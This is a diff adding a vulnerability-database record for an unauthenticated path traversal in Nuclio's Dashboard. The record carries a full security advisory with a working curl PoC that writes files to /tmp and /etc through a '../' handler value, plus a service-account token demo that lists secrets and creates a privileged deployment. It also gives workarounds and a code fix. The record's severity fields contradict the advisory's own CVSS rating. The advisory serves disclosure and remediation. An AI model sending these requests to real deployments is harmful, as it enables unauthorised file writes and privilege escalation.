@@ -1,0 +1,497 @@
+[id]
+ave_id = "AVE-2026-0390"
+aliases = ["CVE-2026-52832","GHSA-wpcj-rmv4-86qg"]
+
+[basic]
+title = "Nuclio: Unauthenticated path traversal in spec.handler allows arbitrary file write in Dashboard container"
+description = "## Summary
+
+Nuclio Dashboard exposes `POST /api/functions` without authentication by default (NOP auth mode). The `spec.handler` field (e.g., `mymodule:myfunction`) is parsed by `functionconfig.ParseHandler()` which splits on `:` only — no path validation is applied to the module portion.
+
+During function build, `writeFunctionSourceCodeToTempFile()` passes the module name directly to `path.Join(tempDir, moduleFileName)`. Go's `path.Join` internally calls `path.Clean`, which resolves `../` sequences and allows the resolved path to escape `tempDir`. The function then calls `os.WriteFile` at the attacker-controlled path with attacker-controlled content (base64-decoded `spec.build.functionSourceCode`).
+
+The write executes in the Dashboard container process running as `uid=0 (root)`, allowing writes to any filesystem location the process can access: `/tmp`, `/etc`, `/usr/local/bin`, `/etc/cron.d`, and more.
+
+- **CVSS 3.1**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` — **7.5 (High)**
+- **CWE**: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
+- **Affected versions**: Nuclio <= 1.15.27 (latest at time of research, dynamically verified)
+
+---
+
+## Details
+
+### Root Cause
+
+The vulnerability spans three functions. The path from user input to disk write is:
+
+**1. `ParseHandler` — no path validation** (`pkg/functionconfig/handler.go:25-38`):
+
+```go
+// pkg/functionconfig/handler.go:25-38
+func ParseHandler(handler string) (string, string, error) {
+    moduleAndEntrypoint := strings.Split(handler, \":\")
+    switch len(moduleAndEntrypoint) {
+    case 1:
+        return \"\", moduleAndEntrypoint[0], nil
+    case 2:
+        // Returns moduleFileName verbatim — no path sanitization
+        return moduleAndEntrypoint[0], moduleAndEntrypoint[1], nil
+    default:
+        return \"\", \"\", errors.Errorf(\"Invalid handler name %s\", handler)
+    }
+}
+```
+
+Input `\"../../../../tmp/vul007_proof.txt:handler\"` returns `moduleFileName = \"../../../../tmp/vul007_proof.txt\"`.
+
+**2. `writeFunctionSourceCodeToTempFile` — unsafe path construction** (`pkg/processor/build/builder.go:613-661`):
+
+```go
+// builder.go:624-657 (abridged)
+tempDir, err := b.mkDirUnderTemp(\"source\")
+// tempDir = /tmp/nuclio-build-<random>/source
+
+runtimeExtension, err := b.getRuntimeFileExtensionByName(b.options.FunctionConfig.Spec.Runtime)
+
+moduleFileName, entrypoint, err := functionconfig.ParseHandler(b.options.FunctionConfig.Spec.Handler)
+// moduleFileName = \"../../../../tmp/vul007_proof.txt\" — attacker-controlled
+
+if !strings.Contains(moduleFileName, \".\") {
+    moduleFileName = fmt.Sprintf(\"%s.%s\", moduleFileName, runtimeExtension)
+}
+// If moduleFileName already contains \".\", no extension is appended
+// \"../../../../tmp/vul007_proof.txt\" contains \".\" -> stays as-is
+
+sourceFilePath := path.Join(tempDir, moduleFileName)
+// path.Join(\"/tmp/nuclio-build-227825660/source\", \"../../../../tmp/vul007_proof.txt\")
+// = \"/tmp/vul007_proof.txt\"   <-- escaped tempDir
+
+b.logger.DebugWith(\"Writing function source code to temporary file\", \"functionPath\", sourceFilePath)
+if err := os.WriteFile(sourceFilePath, decodedFunctionSourceCode, os.FileMode(0644)); err != nil {
+    // Writes attacker-controlled bytes to attacker-controlled path
+```
+
+**3. `cleanupTempDir` does not remove the traversal file** (`builder.go:1047-1061`):
+
+```go
+// builder.go:1053
+err := os.RemoveAll(b.tempDir)
+// Only removes /tmp/nuclio-build-<random>/ — traversal file outside this tree persists
+```
+
+### Path Traversal Calculation
+
+```
+tempDir  = /tmp/nuclio-build-227825660/source   (depth from /: 3 components)
+handler  = \"../../../../tmp/vul007_proof.txt:handler\"
+module   = \"../../../../tmp/vul007_proof.txt\"
+
+path.Join(\"/tmp/nuclio-build-227825660/source\", \"../../../../tmp/vul007_proof.txt\")
+= path.Clean(\"/tmp/nuclio-build-227825660/source/../../../../tmp/vul007_proof.txt\")
+
+Traversal:
+  /tmp/nuclio-build-227825660/source  (start)
+  ../  -> /tmp/nuclio-build-227825660
+  ../  -> /tmp
+  ../  -> /  (filesystem root)
+  ../  -> /  (cannot go above root)
+  tmp/vul007_proof.txt -> /tmp/vul007_proof.txt
+```
+
+The same technique with 4x `../` reaches any path under `/tmp`, `/etc`, `/usr`, etc.
+
+### Full Attack Chain
+
+```
+Unauthenticated HTTP client
+  -> POST /api/functions (no auth, NOP mode)
+       dashboard/resource/function.go:156 storeAndDeployFunction()
+  -> platform.CreateFunction()
+       platform/kube/platform.go:193
+  -> abstract/platform.go:191 HandleDeployFunction()
+  -> abstract/platform.go:119 CreateFunctionBuild()
+  -> builder.Build()
+       processor/build/builder.go:195
+  -> builder.resolveFunctionPath()
+       builder.go:664
+  -> builder.writeFunctionSourceCodeToTempFile()   <-- file write here
+       builder.go:613
+  -> os.WriteFile(attacker_path, attacker_content, 0644)
+       builder.go:657
+```
+
+---
+
+## PoC — Steps to Reproduce
+
+### Environment Setup
+
+The following steps set up an isolated kind cluster and deploy Nuclio 1.15.27. All commands were executed on an Ubuntu host with Docker 29.1.2.
+
+**Step 1: Create isolated kind cluster with Docker socket mounted**
+
+The Dashboard container builder requires access to Docker daemon. Create a kind cluster configuration that mounts the host Docker socket into the cluster node:
+
+```bash
+cat > /tmp/kind-vul007-config.yaml << 'EOF'
+kind: Cluster
+apiVersion: kind.x-k8s.io/v1alpha4
+nodes:
+- role: control-plane
+  extraMounts:
+  - hostPath: /var/run/docker.sock
+    containerPath: /var/run/docker.sock
+EOF
+
+kind create cluster --name vul-007 --config /tmp/kind-vul007-config.yaml
+```
+
+Expected output:
+```
+Creating cluster \"vul-007\" ...
+ ✓ Ensuring node image (kindest/node:v1.27.3)
+ ✓ Preparing nodes
+ ✓ Writing configuration
+ ✓ Starting control-plane
+ ✓ Installing CNI
+ ✓ Installing StorageClass
+Set kubectl context to \"kind-vul-007\"
+```
+
+Verify Docker socket is available inside the cluster node:
+```bash
+docker exec vul-007-control-plane ls -la /var/run/docker.sock
+# srw-rw---- 1 root 988 0 May 17 13:31 /var/run/docker.sock
+```
+
+**Step 2: Deploy Nuclio via Helm**
+
+```bash
+# Create namespace
+kubectl --context kind-vul-007 create namespace nuclio
+
+# Load container images (if pre-pulled)
+kind load docker-image quay.io/nuclio/dashboard:1.15.27-amd64 --name vul-007
+kind load docker-image quay.io/nuclio/controller:1.15.27-amd64 --name vul-007
+
+# Install with Helm (chart from source: hack/k8s/helm/nuclio)
+helm install nuclio ./hack/k8s/helm/nuclio \
+  --namespace nuclio \
+  --kube-context kind-vul-007 \
+  --set controller.image.pullPolicy=Never \
+  --set dashboard.image.pullPolicy=Never \
+  --set registry.pushPullUrl=\"localhost:5000\" \
+  --set dashboard.containerBuilderKind=docker
+```
+
+**Step 3: Wait for Dashboard to be ready**
+
+```bash
+kubectl --context kind-vul-007 wait -n nuclio \
+  --for=condition=ready pod -l nuclio.io/app=dashboard --timeout=90s
+
+# Expected:
+# pod/nuclio-dashboard-b4c5bb96f-txjkt condition met
+```
+
+**Step 4: Expose Dashboard locally**
+
+```bash
+kubectl --context kind-vul-007 port-forward -n nuclio svc/nuclio-dashboard 8073:8070 &
+sleep 3
+
+# Verify Dashboard is accessible
+curl -s -o /dev/null -w \"HTTP %{http_code}\n\" http://localhost:8073/api/functions
+# HTTP 200
+```
+
+**Step 5: Create default project (required by Dashboard API)**
+
+```bash
+curl -s -X POST http://localhost:8073/api/projects \
+  -H \"Content-Type: application/json\" \
+  -d '{\"metadata\":{\"name\":\"default\",\"namespace\":\"nuclio\"},\"spec\":{\"description\":\"default\"}}'
+```
+
+---
+
+### Exploitation
+
+**Step 6: Send path traversal request**
+
+The `handler` field `../../../../tmp/vul007_proof.txt:handler` instructs the build pipeline to write `functionSourceCode` content to `/tmp/vul007_proof.txt` inside the Dashboard container.
+
+```bash
+curl -v -X POST http://localhost:8073/api/functions \
+  -H \"Content-Type: application/json\" \
+  -H \"x-nuclio-project-name: default\" \
+  -d '{
+    \"metadata\": {\"name\": \"vul007-poc\", \"namespace\": \"nuclio\"},
+    \"spec\": {
+      \"runtime\": \"python:3.11\",
+      \"handler\": \"../../../../tmp/vul007_proof.txt:handler\",
+      \"build\": {
+        \"functionSourceCode\": \"UFJPVkVELVBBVEgtVFJBVkVSU0FMLVZVTDAwNw==\"
+      },
+      \"minReplicas\": 0,
+      \"maxReplicas\": 1
+    }
+  }'
+```
+
+`functionSourceCode` base64 decoded: `PROVED-PATH-TRAVERSAL-VUL007`
+
+Expected response:
+```
+HTTP/1.1 202 Accepted
+```
+
+**Step 7: Observe Dashboard build logs**
+
+```bash
+kubectl --context kind-vul-007 logs -n nuclio deploy/nuclio-dashboard --tail=20 \
+  | grep -E \"temporary dir|Writing function source\"
+```
+
+Actual log output (captured during verification, timestamp 2026-05-17 14:55:02 CST):
+```
+26.05.17 14:55:02.225 (D) dashboard.server.api/functions  Created temporary dir
+  {\"dir\": \"/tmp/nuclio-build-227825660/source\"}
+
+26.05.17 14:55:02.225 (D) dashboard.server.api/functions  Writing function source code to temporary file
+  {\"functionPath\": \"/tmp/vul007_proof.txt\"}
+```
+
+The log confirms `functionPath` resolved to `/tmp/vul007_proof.txt`, which is
+**outside** the tempDir `/tmp/nuclio-build-227825660/source`. Path traversal is confirmed.
+
+**Step 8: Verify file written to traversal path**
+
+```bash
+kubectl --context kind-vul-007 exec -n nuclio deploy/nuclio-dashboard \
+  -- cat /tmp/vul007_proof.txt
+```
+
+Output:
+```
+PROVED-PATH-TRAVERSAL-VUL007
+```
+
+```bash
+kubectl --context kind-vul-007 exec -n nuclio deploy/nuclio-dashboard \
+  -- ls -la /tmp/vul007_proof.txt
+```
+
+Output:
+```
+-rw-r--r--    1 root     root            28 May 17 14:55 /tmp/vul007_proof.txt
+```
+
+**Step 9: Write to /etc/ — broader impact demonstration**
+
+```bash
+curl -s -X POST http://localhost:8073/api/functions \
+  -H \"Content-Type: application/json\" \
+  -H \"x-nuclio-project-name: default\" \
+  -d '{
+    \"metadata\": {\"name\": \"vul007-poc2\", \"namespace\": \"nuclio\"},
+    \"spec\": {
+      \"runtime\": \"python:3.11\",
+      \"handler\": \"../../../../etc/vul007-marker.txt:handler\",
+      \"build\": {
+        \"functionSourceCode\": \"VlVMMDA3LVBFUlNJU1RFTlQtTUFSS0VSLXJvb3Q=\"
+      }
+    }
+  }'
+```
+
+Log evidence:
+```
+26.05.17 14:55:50.666 (D) dashboard.server.api/functions  Writing function source code to temporary file
+  {\"functionPath\": \"/etc/vul007-marker.txt\"}
+```
+
+```bash
+kubectl --context kind-vul-007 exec -n nuclio deploy/nuclio-dashboard \
+  -- cat /etc/vul007-marker.txt
+# VUL007-PERSISTENT-MARKER-root
+```
+
+---
+
+### Cleanup
+
+```bash
+kubectl --context kind-vul-007 delete nucliofunction vul007-poc vul007-poc2 -n nuclio 2>/dev/null || true
+kind delete cluster --name vul-007
+```
+
+---
+
+## Impact
+
+### Direct Impact
+
+An unauthenticated attacker with network access to the Nuclio Dashboard port can write arbitrary content to any path accessible by the Dashboard process (running as root) inside the Dashboard container.
+
+Demonstrated write targets:
+- `/tmp/` — confirmed (primary PoC)
+- `/etc/` — confirmed (secondary PoC)
+
+Potential high-impact write targets:
+- `/etc/cron.d/` — write a cron job entry; if a cron daemon runs in the container, this
+  achieves scheduled arbitrary command execution inside the container
+- `/usr/local/bin/<name>` — overwrite a binary called by dashboard processes
+- Any file path accessible by root within the container filesystem
+
+### Privilege Escalation
+
+The Dashboard container runs as `uid=0 (root)`. Its mounted Kubernetes ServiceAccount (`nuclio-dashboard`) holds the following RBAC permissions in the `nuclio` namespace:
+
+```
+Resources         Verbs
+secrets           [*]
+deployments.apps  [*]
+pods              [*]
+configmaps        [*]
+services          [*]
+cronjobs.batch    [*]
+```
+
+Verification: Using the SA token directly against the Kubernetes API:
+
+```bash
+# List secrets — HTTP 200
+curl -k -H \"Authorization: Bearer $SA_TOKEN\" \
+  \"$K8S_API/api/v1/namespaces/nuclio/secrets\"
+# => returns helm release secret, nuclio SA secret
+
+# Create privileged Deployment — HTTP 201
+curl -k -X POST -H \"Authorization: Bearer $SA_TOKEN\" \
+  -H \"Content-Type: application/json\" \
+  \"$K8S_API/apis/apps/v1/namespaces/nuclio/deployments\" \
+  -d '{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"t\",\"image\":\"busybox\",\"securityContext\":{\"privileged\":true}}]}}}}'
+# HTTP_CODE:201
+```
+
+An attacker who compromises the Dashboard container (via this file write vulnerability) gains access to this SA token and can create privileged workloads in the `nuclio` namespace, potentially escalating to cluster-level access depending on cluster configuration.
+
+### Scope
+
+The file write is bounded to the Dashboard **container** filesystem. Host-level writes require additional preconditions (hostPath volumes, privileged container mode, or DinD configuration) not present in a standard Nuclio Kubernetes deployment.
+
+---
+
+## Severity
+
+**CVSS 3.1 Score: 7.5 (High)**
+
+```
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
+```
+
+| Metric | Value | Rationale |
+|--------|-------|-----------|
+| Attack Vector | Network | Dashboard API reachable over network |
+| Attack Complexity | Low | Single HTTP request, no race condition |
+| Privileges Required | None | Default NOP auth mode requires no credentials |
+| User Interaction | None | Fully automated |
+| Scope | Unchanged | Write confined to Dashboard container |
+| Confidentiality | None | No data read in primary attack path |
+| Integrity | High | Arbitrary file write as root in container |
+| Availability | None | No service disruption caused by write |
+
+---
+
+## Affected Versions
+
+- **Nuclio <= 1.15.27** (latest release at time of research)
+- Dynamically verified against `quay.io/nuclio/dashboard:1.15.27-amd64` on 2026-05-17
+
+The vulnerable code path (`writeFunctionSourceCodeToTempFile` in `pkg/processor/build/builder.go`)
+has been present since the `functionSourceCode` inline code feature was introduced.
+
+---
+
+## Patched Versions
+
+https://github.com/nuclio/nuclio/releases/tag/1.16.5
+
+---
+
+## Workarounds
+
+**Option 1: Enable authentication on the Dashboard**
+
+Set `NUCLIO_AUTH_KIND` to a non-NOP value (e.g., `iguazio`) to require credentials. This prevents unauthenticated access to the API. Consult Nuclio documentation for supported auth providers.
+
+```yaml
+# In Dashboard deployment env
+- name: NUCLIO_AUTH_KIND
+  value: \"iguazio\"
+```
+
+**Option 2: Network-level access control**
+
+Restrict network access to the Dashboard port (default 8070) to trusted networks only. Do not expose the Dashboard directly to the internet.
+
+**Option 3: Drop root privileges in the Dashboard container**
+
+Run the Dashboard process as a non-root user to reduce the impact of container-level arbitrary file writes.
+
+---
+
+## Remediation
+
+Add a path boundary check in `writeFunctionSourceCodeToTempFile` after constructing `sourceFilePath`:
+
+```go
+// pkg/processor/build/builder.go — fix for writeFunctionSourceCodeToTempFile
+sourceFilePath := path.Join(tempDir, moduleFileName)
+
+// Verify resolved path is within tempDir
+absPath, err := filepath.Abs(sourceFilePath)
+if err != nil {
+    return \"\", errors.Wrap(err, \"Failed to resolve absolute path\")
+}
+absTempDir, err := filepath.Abs(tempDir)
+if err != nil {
+    return \"\", errors.Wrap(err, \"Failed to resolve absolute tempDir\")
+}
+if !strings.HasPrefix(absPath, absTempDir+string(os.PathSeparator)) {
+    return \"\", errors.Errorf(
+        \"handler module path escapes build directory: %s\", moduleFileName)
+}
+
+b.logger.DebugWith(\"Writing function source code to temporary file\", \"functionPath\", absPath)
+if err := os.WriteFile(absPath, decodedFunctionSourceCode, os.FileMode(0644)); err != nil {
+```
+
+Alternatively, reject any `handler` module name containing path separator characters before the build pipeline is invoked (at API request validation time).
+
+---
+
+## Resources
+
+- Vulnerable file: `pkg/processor/build/builder.go` — function `writeFunctionSourceCodeToTempFile`, line 654
+- Parser: `pkg/functionconfig/handler.go` — function `ParseHandler`, line 25
+- Go `path.Join` behavior: https://pkg.go.dev/path#Join
+- CWE-22: https://cwe.mitre.org/data/definitions/22.html
+- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal"
+severity = "MEDIUM"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-24T03:42:25.392293023+00:00"
